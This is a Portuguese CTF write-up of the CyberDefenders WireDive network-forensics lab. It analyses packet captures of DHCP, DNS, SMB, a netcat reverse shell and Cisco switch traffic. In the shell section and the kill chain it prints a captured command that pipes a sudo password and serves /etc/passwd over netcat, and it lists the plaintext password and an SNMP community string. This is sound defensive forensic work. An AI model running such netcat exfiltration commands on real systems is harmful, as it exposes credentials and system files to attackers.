# 🔍 WireDive — CTF Writeup
### CyberDefenders Blue Team Challenge | Análise de Tráfego de Rede (DHCP, DNS, SMB, Shell e Infraestrutura Cisco)

---

| **Analista**             | Mauricio Robert                                                                     |
|---------------------------|---------------------------------------------------------------------------------------|
| **Organização**           | Faculdade Impacta                                                                     |
| **Data do Relatório**     | 16/07/2026                                                                            |
| **Período de Captura**    | 16/04/2020 e 2017 (dados de tráfego) — analisado em 13-15/07/2026                    |
| **Classificação**         | CONFIDENCIAL                                                                          |
| **Caso CTF**              | WireDive — Network Forensics Challenge                                               |
| **Ferramentas**           | Wireshark, Zui (Zeek/Brim), NetworkMiner, Brave Search                               |
| **Arquivos Analisados**   | `dhcp.pcapng`, `dns.pcapng`, `smb.pcapng`, `shell.pcapng`, `network.pcapng`          |

---

## 🔍 Resumo Executivo

Este relatório documenta a análise forense de **cinco capturas de tráfego de rede** (`dhcp.pcapng`, `dns.pcapng`, `smb.pcapng`, `shell.pcapng` e `network.pcapng`) no âmbito do desafio de forense de rede **WireDive** (CyberDefenders Blue Team). As quatro primeiras capturas referem-se a um cenário de comprometimento de um host **Linux Ubuntu 18.04 "Bionic Beaver"** (hostname `ns01`, usuário `jtomato`) através do estabelecimento de uma **reverse shell via netcat**. A investigação, conduzida com **Wireshark**, **Zui** (interface para dados Zeek/Suricata) e **NetworkMiner**, cobriu a atribuição de endereçamento via **DHCP**, a resolução de nomes via **DNS** (incluindo uma flag entregue por registro TXT), o acesso a compartilhamentos **SMB** contendo um arquivo sensível (`TradeSecrets.txt`) e uma flag embutida em tráfego SMB, e por fim a cadeia de exploração via **shell reversa**, incluindo a instalação do netcat, a elevação de privilégios com senha em texto claro e a exfiltração do arquivo `/etc/passwd` através de uma segunda shell. A quinta captura (`network.pcapng`) amplia o escopo para uma **infraestrutura de rede corporativa** baseada em switches e roteadores **Cisco** (`CCNP-LAB-S1`/`S2`), cobrindo protocolos de camada 2 e 3 como **STP/RSTP**, **CDP**, **HSRP**, **SNMP**, **NTP**, **DHCP**, **DNS** e **RADIUS**, incluindo um dump de configuração NVRAM transmitido via **TFTP**. Ao todo, **vinte e nove questões técnicas** foram respondidas com base em evidências extraídas diretamente dos pacotes capturados.

---

## 🛠 Ferramentas e Fontes Utilizadas

| Ferramenta               | Finalidade                                                                                                       | Arquivo / Referência                                                             |
|----------------------------|--------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| **Wireshark**              | Inspeção de pacotes, Follow TCP/UDP Stream, filtros de exibição (`dhcp`, `dns`, `smb2`, `cdp`, `stp`, `hsrp`, `snmp`, `icmpv6`) | `dhcp.pcapng`, `dns.pcapng`, `smb.pcapng`, `shell.pcapng`, `network.pcapng`         |
| **Zui (Zeek/Suricata)**    | Consulta de logs `conn`, `http`, `dns`, `ntp` e alertas gerados a partir das capturas                              | `shell.pcapng`, `network.pcapng`                                                    |
| **NetworkMiner**           | Reconstrução de hosts, sessões e User-Agent HTTP                                                                   | `shell.pcapng`                                                                       |
| **Brave Search**           | Confirmação do codinome da versão do Ubuntu 18.04 LTS                                                              | `search.brave.com`                                                                   |

---

## 📋 Perguntas e Respostas — DHCP (`dhcp.pcapng`)

### Q1 — What IP address is requested by the client?

> **Resposta: `192.168.2.244`**

**Solução:** A estatística de **Endpoints IPv4** do Wireshark (*Statistics → Endpoints*) para o arquivo `dhcp.pcapng` evidencia o host **192.168.2.244** como o principal endereço envolvido nas trocas de pacotes DHCP capturadas, correspondendo ao endereço concedido/solicitado pelo cliente ao longo da sessão (DHCP Discover → Offer → Request → ACK).

![IP Request](/Forensic/WireDive/images/dhcp.file/IP_Request_by_Client(1).png)


### Q2 — What is the transaction ID for the DHCP release?

> **Resposta: `0x9f8fa557`**

**Solução:** O pacote nº 176 (frame 176) do `dhcp.pcapng` contém uma mensagem **DHCP Release** enviada por `192.168.2.244` para o servidor `192.168.2.1`. O campo **"Transaction ID"** do cabeçalho DHCP, destacado nos bytes brutos do pacote, exibe o valor **`0x9f8fa557`**, distinto do Transaction ID `0x2a7d544b` utilizado no ciclo Discover/Offer/Request/ACK anterior.

![ID DHCP](/Forensic/WireDive/images/dhcp.file/Transaction_ID_DHCP(2).png)

---

### Q3 — What is the MAC address of the client?

> **Resposta: `00:0c:29:82:f5:94`**

**Solução:** Ao inspecionar os pacotes trocados com o endereço `192.168.2.244` (filtro `ip.addr == 192.168.2.244`), o campo **"Destination"** do cabeçalho Ethernet II do pacote 207 identifica o endereço de hardware do cliente como `VMware_82:f5:94`, correspondente ao MAC **`00:0c:29:82:f5:94`** — o mesmo endereço observado como origem nas mensagens DHCP Discover/Request/Release do host `jim-desktop`.

![MAC Client](/Forensic/WireDive/images/dhcp.file/MAC_Address_of_the_Client(3).png)

---

## 📋 Perguntas e Respostas — DNS (`dns.pcapng`)

### Q4 — What is the response for the lookup for flag.fruitinc.xyz?

> **Resposta: `ACOOLDNSFLAG`**

**Solução:** O pacote nº 24 do `dns.pcapng` é uma resposta DNS (*Standard query response 0x41ff*) para a consulta do tipo **TXT** ao domínio `flag.fruitinc.xyz`. A seção **"Answers"** mostra um registro TXT com 12 bytes de comprimento e conteúdo **"ACOOLDNSFLAG"**, conforme destacado tanto na árvore de detalhes quanto nos bytes brutos do pacote.

![Response](/Forensic/WireDive/images/dns.file/Reponse_of_the_NSLOOKUP(1).png)

---

### Q5 — Which root server responds to the google.com query? Hostname.

> **Resposta: `e.root-servers.net`**

**Solução:** Na resposta à consulta NS para a zona raiz (`<Root>`), diversos servidores raiz são listados como autoritativos. Ao correlacionar a resposta subsequente da consulta A para `google.com`, o registro **"Name Server"** destacado na árvore de protocolo aponta para **`e.root-servers.net`** como o servidor que efetivamente responde na cadeia de resolução observada.

![Hostname](/Forensic/WireDive/images/dns.file/Response_of_root_NSLOOKUP(2).png)

---

## 📋 Perguntas e Respostas — SMB (`smb.pcapng`)

### Q6 — What is the path of the file that is opened?

> **Resposta: `HelloWorld\TradeSecrets.txt`**

**Solução:** No fluxo SMB2, uma requisição **"Create Request"** é enviada para a árvore `\\192.168.2.10\public`, referenciando o campo **"Filename"** com o valor **`HelloWorld\TradeSecrets.txt`**, conforme destacado na árvore de detalhes do pacote e nos bytes brutos (codificação UTF-16LE) correspondentes ao nome do arquivo.

![Path File](/Forensic/WireDive/images/smb,file/File_Path_Open(1).png)

---

### Q7 — What was the hex status code when the user SAMBA\jtomato logs in?

> **Resposta: `0xc000006d (STATUS_LOGON_FAILURE)`**

**Solução:** O pacote nº 76 é uma resposta SMB2 **Session Setup** referente à tentativa de autenticação NTLMSSP_AUTH do usuário `SAMBA\jtomato` (frame 75). O campo **"NT Status"** do cabeçalho SMB2 exibe o código **`STATUS_LOGON_FAILURE (0xc000006d)`**, indicando falha de autenticação para essa credencial.

![jtomato](/Forensic/WireDive/images/smb,file/Hex_Status_Status_SAMBA\jtomato(2).png)

---

### Q8 — What is the tree that is being browsed?

> **Resposta: `\\192.168.2.10\public`**

**Solução:** Após uma sessão anônima autenticada com sucesso, o cliente envia uma requisição **"Tree Connect"** para `\\192.168.2.10\public`. O *Follow TCP Stream* do fluxo correspondente evidencia a navegação (browsing) subsequente desse compartilhamento via consultas `FSCTL_DFS_GET_REFERRALS` e *Find Requests*, confirmando **`\\192.168.2.10\public`** como a árvore percorrida.

![Tree](/Forensic/WireDive/images/smb,file/Begin_Browsed_Tree(3).png)

---

### Q9 — What is the flag in the file?

> **Resposta: `flag<OneSuperDuperSecret>`**

**Solução:** Ao aplicar *Follow TCP Stream* no fluxo SMB2 (`tcp.stream eq 5`) referente à leitura do conteúdo do compartilhamento, o texto reconstruído da conversa revela, ao final, a string **`flag<OneSuperDuperSecret>`** destacada, que corresponde à flag armazenada no arquivo acessado via SMB.

![Flag](/Forensic/WireDive/images/smb,file/Flag_in_the_File(4).png)

---

## 📋 Perguntas e Respostas — Shell (`shell.pcapng`)

### Q10 — What port is the shell listening on?

> **Resposta: `4444`**

**Solução:** A consulta ao log `conn` do Zeek (via Zui) para `shell.pcapng` mostra uma conexão TCP originada em `192.168.2.5:52242` destinada a `192.168.2.244:4444` (`resp_p: 4444`), correspondente ao listener netcat inicial que recebe a primeira conexão de shell reversa.

![Port Listening](/Forensic/WireDive/images/shell.file/Port_of_Shell_Listening(1).png)

---

### Q11 — What is the port for the second shell?

> **Resposta: `9999`**

**Solução:** Um segundo registro `conn` no log do Zeek mostra uma nova conexão TCP entre `192.168.2.244:34972` e `192.168.2.5:9999` (`resp_p: 9999`), evidenciando o estabelecimento de uma **segunda shell/listener netcat** na porta 9999, distinta da primeira conexão na porta 4444.

![Second Port](/Forensic/WireDive/images/shell.file/Second_Shell(2).png)

---

### Q12 — What version of netcat is installed?

> **Resposta: `1.10-41.1`**

**Solução:** O log `http` do Zeek (consultado via Zui, filtro "netcat") mostra uma requisição **GET** ao host `us.archive.ubuntu.com` para a URI `/ubuntu/pool/universe/n/netcat/netcat_1.10-41.1_all.deb`, confirmando a versão **1.10-41.1** do pacote netcat obtida via `apt install`, o que é corroborado pela saída do *Follow TCP Stream* ("Setting up netcat (1.10-41.1) ...").

![Version NetCat](/Forensic/WireDive/images/shell.file/Version_of_NetCat(3).png)

---

### Q13 — What file is added to the second shell?

> **Resposta: `/etc/passwd`**

**Solução:** No *Follow TCP Stream* do fluxo referente à segunda shell, observa-se o comando `echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd`, no qual o conteúdo do arquivo **`/etc/passwd`** é redirecionado como entrada para o listener netcat na porta 9999, sendo assim transmitido (exfiltrado) através dessa segunda shell.

![File in Second Shell](/Forensic/WireDive/images/shell.file/File_Aded_in_Second_Shell(4).png)

---

### Q14 — What password is used to elevate the shell?

> **Resposta: `*umR@Q%4V&RC`**

**Solução:** Em múltiplos comandos capturados no *Follow TCP Stream* do fluxo principal (`tcp.stream eq 0`), o padrão `echo "*umR@Q%4V&RC" | sudo -S ...` é utilizado repetidamente para fornecer a senha do usuário `jtomato` ao `sudo` via stdin, permitindo a instalação do netcat e a posterior elevação de privilégio para execução de comandos como root.

![Pass to Elevate](/Forensic/WireDive/images/shell.file/Password_to_Elevate_Privilege(5).png)

---

### Q15 — What is the codename of the target system's OS version?

> **Resposta: `Bionic Beaver`**

**Solução:** O **NetworkMiner** identifica, entre os parâmetros do host `192.168.2.5`, o User-Agent HTTP `"Debian APT-HTTP/1.3 (1.6.12)"` associado a requisições para repositórios com o codinome `bionic` (ex.: `/ubuntu/dists/bionic-security/InRelease`). Uma busca complementar via **Brave Search** confirma que **"Bionic"** corresponde ao codinome do **Ubuntu 18.04 LTS (Bionic Beaver)**.

![Ubuntu Codename](/Forensic/WireDive/images/shell.file/Ubunto_Codename(5).png)

---

### Q16 — How many users are on the target system?

> **Resposta: `31 usuários`**

**Solução:** O conteúdo do arquivo `/etc/passwd`, exfiltrado através da segunda shell (porta 9999) e reconstruído via *Follow TCP Stream* (`tcp.stream eq 6`), lista as contas presentes no sistema-alvo. A contagem das linhas do arquivo — de `root` até `bind`, incluindo a conta de usuário `jtomato` — totaliza **31 entradas de usuário** no host `ns01`.

![Users Target](/Forensic/WireDive/images/shell.file/Number_of_users_in_target(6).png)

---

## 📋 Perguntas e Respostas — Infraestrutura de Rede (`network.pcapng` — WireDive)

Esta seção analisa `network.pcapng`, captura referente à infraestrutura de rede do desafio WireDive, composta por switches/roteadores Cisco (`CCNP-LAB-S1` e `CCNP-LAB-S2`), interligados por enlaces trunk 802.1Q com múltiplas VLANs, protocolos de redundância (HSRP), gerência (CDP, SNMP), sincronismo de horário (NTP), resolução de nomes (DNS) e autenticação (RADIUS).

### Q17 — What is the IPv6 NTP server IP?

> **Resposta: `2003:51:6012:110::dcf7:123`**

**Solução:** A aba IPv6 da janela *Statistics → Endpoints* do `network.pcapng` lista apenas dois endereços IPv6 envolvidos em tráfego NTP: `2003:51:6012:121::10` e `2003:51:6012:110::dcf7:123`. Os registros do log `ntp` (via Zui) mostram uma requisição em modo cliente (`mode: 3`) originada em `2003:51:6012:121::10` com destino ao par via IPv6, confirmando **`2003:51:6012:110::dcf7:123`** como o servidor NTP IPv6 consultado.

![IPv6](/Forensic/WireDive/images/network.file/NTP_IPv6(1).png)

---

### Q18 — What is the first IP address that is requested by the DHCP client?

> **Resposta: `192.168.20.11`**

**Solução:** O filtro `dhcp` no `network.pcapng` exibe seis pacotes. O primeiro, frame 1254 (`t=121.772905s`), é uma mensagem **DHCP Request** enviada por `0.0.0.0`, cujo campo **Option (50) Requested IP Address** contém o valor **`192.168.20.11`** — pedido que é recusado (DHCP NAK) pelo servidor `192.168.30.1`, levando a um novo ciclo Discover/Offer/Request/ACK que concede o endereço `192.168.30.11`.

![First IP](/Forensic/WireDive/images/network.file/First_IP_Request(2).png)

---

### Q19 — What is the first authoritative name server returned for the domain that is being queried?

> **Resposta: `ns2.hans.hosteurope.de`**

**Solução:** A resposta DNS (frame 243, Transaction ID `0xb4ca`) à consulta A para `blog.webernetz.net` traz duas *Authority RRs*. Nos bytes brutos do pacote, a primeira registrada é composta pelos rótulos de comprimento 3, 4, 10 e 2 — "ns2", "hans", "hosteurope" e "de" —, formando o primeiro servidor de nomes autoritativo retornado: **`ns2.hans.hosteurope.de`**, seguido de um segundo registro (`ns1.hans.hosteurope.de`) via ponteiro de compressão DNS.

![Authoritative Name](/Forensic/WireDive/images/network.file/First_Authoritative_Name_Required(3).png)

---

### Q20 — What is the number of the first VLAN to have a topology change occur?

> **Resposta: `20`**

**Solução:** Ao filtrar por `stp`, o frame 42 é o primeiro BPDU com a flag **"Topology Change"** ativa (Info: "RST. TC + Root = 24576/20/00:21:1b:ae:31:80"). A árvore de detalhes do protocolo Spanning Tree confirma o campo **"Originating VLAN (PVID)"** com o valor **20**, indicando a VLAN 20 como a primeira a registrar uma mudança de topologia na captura.

![Topology](/Forensic/WireDive/images/network.file/First_Vlan_Change_Occur(4).png)

---

### Q21 — What is the port for CDP for CCNP-LAB-S2?

> **Resposta: `GigabitEthernet0/2`**

**Solução:** Os anúncios CDP originados por `Cisco_a1:5a:9a` identificam o Device ID `CCNP-LAB-S2.webernetz.net`. O campo **"Port ID"** desses pacotes, destacado na árvore de protocolo e nos bytes brutos ("GigabitEthernet0/2"), indica que o switch **CCNP-LAB-S2** anuncia CDP através da interface **GigabitEthernet0/2**.

![CDP Port](/Forensic/WireDive/images/network.file/Port_CDP_to_CCNP_LAB_S2(5).png)

---

### Q22 — What is the MAC address for the root bridge for VLAN 60?

> **Resposta: `00:21:1b:ae:31:80`**

**Solução:** Filtrando por `stp` e localizando o BPDU com "Originating VLAN: 60" (frame 118, originado por `Cisco_ae:31:99`), o campo **"Root Identifier"** exibe a prioridade 24576 e o endereço MAC **`00:21:1b:ae:31:80`**, correspondente à *bridge* raiz (root bridge) eleita para a VLAN 60 nessa topologia PVST+/RSTP.

![MAC Vlan 60](/Forensic/WireDive/images/network.file/MAC_Address_Root_Bridge_VLAN_60(6).png)

---

### Q23 — What is the IOS version running on CCNP-LAB-S2?

> **Resposta: `12.1(22)EA14`**

**Solução:** No mesmo pacote CDP de `CCNP-LAB-S2`, o campo **"Software Version"** detalha: *"Cisco Internetwork Operating System Software, IOS (tm) C2950 Software (C2950-I6K2L2Q4-M), Version 12.1(22)EA14, RELEASE SOFTWARE (fc1)"*, confirmando a versão **12.1(22)EA14** do IOS em execução no switch Catalyst 2950.

![IOS Version](/Forensic/WireDive/images/network.file/IOS_Version_Running_in_CCNP_LAB_S2(7).png)

---

### Q24 — What is the virtual IP address used for HSRP group 121?

> **Resposta: `192.168.121.1`**

**Solução:** Ao filtrar por `hsrp`, o frame 15 (HSRPv2 Hello, state Active) enviado por `192.168.121.254` contém, na seção **"Group State TLV"**, o campo `Group: 121` e o campo **"Virtual IP Address"** com o valor **`192.168.121.1`**, correspondente ao endereço IP virtual compartilhado pelos roteadores participantes do grupo HSRP 121.

![Virtual IP](/Forensic/WireDive/images/network.file/Virtual_IP_Group_121(8).png)

---

### Q25 — How many router solicitations were sent?

> **Resposta: `3`**

**Solução:** Aplicando o filtro `icmpv6.type == 133` (Router Solicitation) no `network.pcapng`, a barra de status do Wireshark indica "Displayed: 3", correspondendo aos frames 1187, 1220 e 1267, todos originados por `Dell_e9:bb:47` (`fe80::221:70ff:fee9:bb47`) com destino ao multicast `ff02::2`, confirmando o envio de **três Router Solicitations** na captura.

![Solicitations Sent](/Forensic/WireDive/images/network.file/Router_Solicitation_Sent(9).png)

---

### Q26 — What is the management address of CCNP-LAB-S2?

> **Resposta: `192.168.121.20`**

**Solução:** No pacote CDP de `CCNP-LAB-S2`, a seção **"Management Addresses"** (Number of addresses: 1) lista o campo **"IP address"**, destacado nos bytes brutos do pacote, com o valor **`192.168.121.20`**, correspondente ao endereço de gerência anunciado pelo switch.

![Management Address](/Forensic/WireDive/images/network.file/Management_Address_CCNP_LAB_S2(10).png)

---

### Q27 — What is the interface being reported on in the first SNMP query?

> **Resposta: `Fa0/1`**

**Solução:** O primeiro par de pacotes ao filtrar por `snmp` (frames 1911/1912, get-request/get-response via SNMPv2c, comunidade `n5rAD1ig314IqfioYBWw`) consulta, entre outros OIDs, o objeto `1.3.6.1.2.1.31.1.1.1.2` (ifName). O primeiro item da lista **"variable-bindings"** na resposta traz o valor **"Fa0/1"**, identificando a interface **FastEthernet0/1** como a reportada nessa primeira consulta SNMP.

![First SNMP Query](/Forensic/WireDive/images/network.file/Management_Address_CCNP_LAB_S2(10).png)

---

### Q28 — When was the NVRAM config last updated?

> **Resposta: `2017-03-03 21:02 UTC`**

**Solução:** Um dump de configuração é transferido via TFTP (*Write Request*, arquivo `CCNP-LAB-R2-Mar--3-20-02-38.701-7`) e reconstruído a partir dos pacotes UDP subsequentes. O conteúdo em texto claro exibe as linhas *"Last configuration change at 20:55:45 UTC Fri Mar 3 2017"* e **"NVRAM config last updated at 21:02:36 UTC Fri Mar 3 2017 by weberjoh"**, confirmando que a configuração salva na NVRAM foi atualizada pela última vez em **2017-03-03 21:02 UTC**.

![NVRAM](/Forensic/WireDive/images/network.file/First_Interface_SNMP_Querry(11).png)

---

### Q29 — What is the IPv6 of the RADIUS server?

> **Resposta: `2001:DB8::1812`**

**Solução:** No mesmo backup de configuração transferido via TFTP/UDP (*Follow UDP Stream*, `udp.stream eq 54`), a seção de configuração do IOS contém o bloco `radius server blubb` com a linha `address ipv6 2001:DB8::1812 auth-port 1812 acct-port 1813`, confirmando **`2001:DB8::1812`** como o endereço IPv6 do servidor RADIUS configurado no dispositivo.

![IPv6 Radius](/Forensic/WireDive/images/network.file/NVRAM_Last_Update(12).png)

---

## ⛓ Fluxo do Ataque (Kill Chain)

```
[FASE 1 — ENDEREÇAMENTO E RECONHECIMENTO]
    Host 192.168.2.244 (jim-desktop, MAC 00:0c:29:82:f5:94)
    Obtém endereço via DHCP (Discover/Offer/Request/ACK)
    Consulta DNS a flag.fruitinc.xyz → registro TXT: ACOOLDNSFLAG
    ↓
[FASE 2 — ACESSO A COMPARTILHAMENTO SMB]
    Tentativa de logon SAMBA\jtomato → STATUS_LOGON_FAILURE (0xc000006d)
    Sessão anônima bem-sucedida → Tree Connect \\192.168.2.10\public
    Navegação (FSCTL_DFS_GET_REFERRALS / Find Requests)
    Abertura de HelloWorld\TradeSecrets.txt
    Conteúdo revela flag: flag<OneSuperDuperSecret>
    ↓
[FASE 3 — ESTABELECIMENTO DA REVERSE SHELL]
    Conexão TCP 192.168.2.5:52242 → 192.168.2.244:4444 (1ª shell/listener)
    Instalação de netcat 1.10-41.1 via apt (us.archive.ubuntu.com)
    Elevação de privilégio: echo "*umR@Q%4V&RC" | sudo -S ...
    Sistema-alvo identificado: Ubuntu 18.04 LTS "Bionic Beaver" (ns01)
    ↓
[FASE 4 — SEGUNDA SHELL E EXFILTRAÇÃO]
    Conexão TCP 192.168.2.244:34972 → 192.168.2.5:9999 (2ª shell/listener)
    Comando: echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd
    Arquivo /etc/passwd exfiltrado (31 contas de usuário identificadas)
    ↓
[FASE 5 — INFRAESTRUTURA DE REDE CORPORATIVA (network.pcapng)]
    Switches Cisco CCNP-LAB-S1/S2 interligados via trunk 802.1Q
    STP/RSTP: 1ª mudança de topologia na VLAN 20
    Root bridge VLAN 60: 00:21:1b:ae:31:80
    HSRP grupo 121 → VIP 192.168.121.1
    CDP: CCNP-LAB-S2 (Gi0/2, mgmt 192.168.121.20, IOS 12.1(22)EA14)
    SNMPv2c (comunidade em texto claro) consulta interface Fa0/1
    NTP IPv6: servidor 2003:51:6012:110::dcf7:123
    DNS externo: NS autoritativo ns2.hans.hosteurope.de
    RADIUS IPv6: 2001:DB8::1812
    Backup NVRAM via TFTP em texto claro (última atualização 2017-03-03 21:02 UTC)
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| IP solicitado pelo cliente DHCP | Wireshark → Statistics/Endpoints (`dhcp.pcapng`) | `192.168.2.244` |
| Transaction ID do DHCP Release | Wireshark → frame 176 | `0x9f8fa557` |
| MAC do cliente | Wireshark → filtro `ip.addr` / Ethernet II | `00:0c:29:82:f5:94` |
| Flag no registro TXT | Wireshark → frame 24 (`dns.pcapng`) | `ACOOLDNSFLAG` |
| Servidor raiz que responde | Wireshark → resposta NS / A (google.com) | `e.root-servers.net` |
| Caminho do arquivo SMB aberto | Wireshark → SMB2 Create Request | `HelloWorld\TradeSecrets.txt` |
| Status de logon SAMBA\jtomato | Wireshark → frame 76 (SMB2 Session Setup) | `0xc000006d` |
| Árvore SMB navegada | Wireshark → Tree Connect / Follow TCP Stream | `\\192.168.2.10\public` |
| Flag no arquivo SMB | Wireshark → Follow TCP Stream (`tcp.stream eq 5`) | `flag<OneSuperDuperSecret>` |
| Porta da 1ª shell | Zui → log `conn` (`shell.pcapng`) | `4444` |
| Porta da 2ª shell | Zui → log `conn` | `9999` |
| Versão do netcat instalado | Zui → log `http` | `1.10-41.1` |
| Arquivo exfiltrado na 2ª shell | Wireshark → Follow TCP Stream | `/etc/passwd` |
| Senha de elevação | Wireshark → Follow TCP Stream (`tcp.stream eq 0`) | `*umR@Q%4V&RC` |
| Codinome do SO alvo | NetworkMiner + Brave Search | `Bionic Beaver` |
| Nº de usuários no sistema-alvo | Wireshark → Follow TCP Stream (`tcp.stream eq 6`) | `31` |
| Servidor NTP IPv6 | Wireshark/Zui → Endpoints IPv6 / log `ntp` | `2003:51:6012:110::dcf7:123` |
| 1º IP solicitado via DHCP (network) | Wireshark → frame 1254 | `192.168.20.11` |
| 1º NS autoritativo | Wireshark → frame 243 (resposta DNS) | `ns2.hans.hosteurope.de` |
| 1ª VLAN com topology change | Wireshark → frame 42 (STP) | `VLAN 20` |
| Porta CDP do CCNP-LAB-S2 | Wireshark → pacote CDP | `GigabitEthernet0/2` |
| Root bridge VLAN 60 | Wireshark → frame 118 (STP) | `00:21:1b:ae:31:80` |
| Versão IOS do CCNP-LAB-S2 | Wireshark → pacote CDP (Software Version) | `12.1(22)EA14` |
| VIP do grupo HSRP 121 | Wireshark → frame 15 (HSRPv2 Hello) | `192.168.121.1` |
| Nº de Router Solicitations | Wireshark → filtro `icmpv6.type==133` | `3` |
| Endereço de gerência CCNP-LAB-S2 | Wireshark → pacote CDP (Management Addresses) | `192.168.121.20` |
| Interface na 1ª consulta SNMP | Wireshark → frames 1911/1912 | `Fa0/1` |
| Última atualização do NVRAM | Wireshark → Follow UDP Stream (TFTP) | `2017-03-03 21:02 UTC` |
| IPv6 do servidor RADIUS | Wireshark → Follow UDP Stream (config IOS) | `2001:DB8::1812` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Valor | Contexto |
|------|-------|----------|
| IP do cliente | `192.168.2.244` | Host `jim-desktop`, obteve endereço via DHCP e originou a shell reversa |
| MAC do cliente | `00:0c:29:82:f5:94` | Endereço de hardware do host `192.168.2.244` |
| Domínio DNS | `flag.fruitinc.xyz` | Registro TXT contendo a flag `ACOOLDNSFLAG` |
| Compartilhamento SMB | `\\192.168.2.10\public` | Árvore SMB navegada, contendo `HelloWorld\TradeSecrets.txt` |
| Usuário SMB | `SAMBA\jtomato` | Tentativa de logon falha — `STATUS_LOGON_FAILURE` (`0xc000006d`) |
| Porta shell 1 | `4444/tcp` | Listener netcat inicial (`192.168.2.244` → `192.168.2.5`) |
| Porta shell 2 | `9999/tcp` | Segundo listener netcat, usado para exfiltrar `/etc/passwd` |
| Pacote instalado | `netcat 1.10-41.1` | Instalado via apt a partir de `us.archive.ubuntu.com` |
| Credencial exposta | `*umR@Q%4V&RC` | Senha em texto claro do usuário `jtomato`, usada em `sudo -S` |
| Sistema-alvo | `Ubuntu 18.04 LTS (Bionic Beaver)` | 31 contas de usuário identificadas em `/etc/passwd` |
| Switch de borda | `CCNP-LAB-S2.webernetz.net` | Porta CDP/gerência `GigabitEthernet0/2`, IP de gerência `192.168.121.20`, IOS `12.1(22)EA14` |
| Root bridge VLAN 60 | `00:21:1b:ae:31:80` | Bridge raiz eleita via STP/PVST+ para a VLAN 60 |
| HSRP grupo 121 | `192.168.121.1` | Endereço IP virtual compartilhado pelos roteadores do grupo |
| Servidor NTP (IPv6) | `2003:51:6012:110::dcf7:123` | Servidor NTP consultado via IPv6 (mode 3/cliente) |
| Servidor RADIUS (IPv6) | `2001:DB8::1812` | Configurado via `"radius server blubb"` no backup de configuração |
| NS autoritativo | `ns2.hans.hosteurope.de` | Primeiro NS retornado na resolução de `blog.webernetz.net` |
| Config NVRAM | Atualizada em `2017-03-03 21:02 UTC` | Backup `CCNP-LAB-R2-Mar--3-20-02-38.701-7` transferido via TFTP |
| Técnica (MITRE ATT&CK) | `T1059` | Command and Scripting Interpreter |
| Técnica (MITRE ATT&CK) | `T1071.004` | Application Layer Protocol: DNS |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files |
| Técnica (MITRE ATT&CK) | `T1040` | Network Sniffing |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | IP solicitado pelo cliente | `192.168.2.244` |
| Q2 | Transaction ID do DHCP release | `0x9f8fa557` |
| Q3 | MAC address do cliente | `00:0c:29:82:f5:94` |
| Q4 | Resposta do lookup para flag.fruitinc.xyz | `ACOOLDNSFLAG` |
| Q5 | Root server que responde à consulta google.com | `e.root-servers.net` |
| Q6 | Caminho do arquivo aberto via SMB | `HelloWorld\TradeSecrets.txt` |
| Q7 | Status hex do logon SAMBA\jtomato | `0xc000006d (STATUS_LOGON_FAILURE)` |
| Q8 | Árvore SMB navegada | `\\192.168.2.10\public` |
| Q9 | Flag no arquivo | `flag<OneSuperDuperSecret>` |
| Q10 | Porta em que a shell escuta | `4444` |
| Q11 | Porta da segunda shell | `9999` |
| Q12 | Versão do netcat instalado | `1.10-41.1` |
| Q13 | Arquivo adicionado à segunda shell | `/etc/passwd` |
| Q14 | Senha usada para elevar a shell | `*umR@Q%4V&RC` |
| Q15 | Codinome da versão do SO alvo | `Bionic Beaver` |
| Q16 | Quantidade de usuários no sistema-alvo | `31 usuários` |
| Q17 | IP do servidor NTP IPv6 | `2003:51:6012:110::dcf7:123` |
| Q18 | Primeiro IP solicitado pelo cliente DHCP | `192.168.20.11` |
| Q19 | Primeiro NS autoritativo retornado | `ns2.hans.hosteurope.de` |
| Q20 | Número da primeira VLAN com topology change | `20` |
| Q21 | Porta CDP do CCNP-LAB-S2 | `GigabitEthernet0/2` |
| Q22 | MAC da root bridge da VLAN 60 | `00:21:1b:ae:31:80` |
| Q23 | Versão do IOS no CCNP-LAB-S2 | `12.1(22)EA14` |
| Q24 | IP virtual do grupo HSRP 121 | `192.168.121.1` |
| Q25 | Quantidade de router solicitations enviados | `3` |
| Q26 | Endereço de gerência do CCNP-LAB-S2 | `192.168.121.20` |
| Q27 | Interface reportada na primeira consulta SNMP | `Fa0/1` |
| Q28 | Última atualização da config NVRAM | `2017-03-03 21:02 UTC` |
| Q29 | IPv6 do servidor RADIUS | `2001:DB8::1812` |

---

## 📚 Referências

- **Wireshark** — Análise de capturas `dhcp.pcapng`, `dns.pcapng`, `smb.pcapng`, `shell.pcapng` e `network.pcapng` (Follow TCP/UDP Stream, filtros de exibição `dhcp` / `dns` / `smb2` / `cdp` / `stp` / `hsrp` / `snmp` / `icmpv6`)
- **Zui (Zeek/Suricata)** — Consultas aos logs `conn`, `http`, `dns`, `ntp` e `known_services` extraídos de `shell.pcapng` e `network.pcapng`
- **NetworkMiner 3.1** — Reconstrução de hosts, sessões TCP e identificação de User-Agent HTTP
- [Brave Search](https://search.brave.com) — Confirmação do codinome Bionic Beaver para o Ubuntu 18.04 LTS
- **CyberDefenders / WireDive** — Network Forensics CTF Lab (`network.pcapng`)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1071.004 — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1040 — Network Sniffing](https://attack.mitre.org/techniques/T1040/)

---